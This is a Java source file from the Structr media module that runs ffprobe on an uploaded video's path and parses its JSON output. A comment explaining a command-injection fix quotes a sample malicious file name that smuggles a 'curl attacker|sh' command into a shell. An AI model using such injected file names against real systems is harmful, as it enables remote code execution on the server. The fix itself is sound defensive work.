/*
 * Copyright (C) 2010-2026 Structr GmbH
 *
 * This file is part of Structr <http://structr.org>.
 *
 * Structr is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * Structr is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with Structr.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.structr.media;

import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;
import org.structr.common.SecurityContext;
import org.structr.util.AbstractProcess;

import java.util.List;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 *
 *
 */

public class GetVideoInfoProcess extends AbstractProcess<Map<String, Object>> {

	private final String path;

	public GetVideoInfoProcess(final SecurityContext securityContext, final String path) {

		super(securityContext);

		this.path = path;
	}

	@Override
	public void preprocess() {
	}

	/**
	 * The path is a file path, and in a mounted folder it carries the file name, which a non-admin can
	 * choose - an upload with content type video/* types the file to VideoFile and OnUploadCompletion
	 * calls this. Through a shell, a name like "x;curl attacker|sh;.mp4" was a command. As arguments it
	 * is a file name that ffprobe will simply not find.
	 *
	 * <p>The "if [ -x $(which ffprobe) ]" guard this replaces was shell syntax and is gone with the
	 * shell; a missing ffprobe now surfaces as an IOException from the process start, which call()
	 * logs, instead of an empty successful run.
	 */
	@Override
	public List<String> getCommandArguments() {

		return List.of("ffprobe", "-v", "verbose", "-show_format", "-show_streams", "-of", "json", path);
	}

	@Override
	public StringBuilder getCommandLine() {

		return null;
	}

	@Override
	public Map<String, Object> processExited(int exitCode) {

		if (exitCode == 0) {

			return new GsonBuilder().create().fromJson(outputStream(), new TypeToken<LinkedHashMap<String, Object>>(){}.getType());
		}

		return null;
	}
}

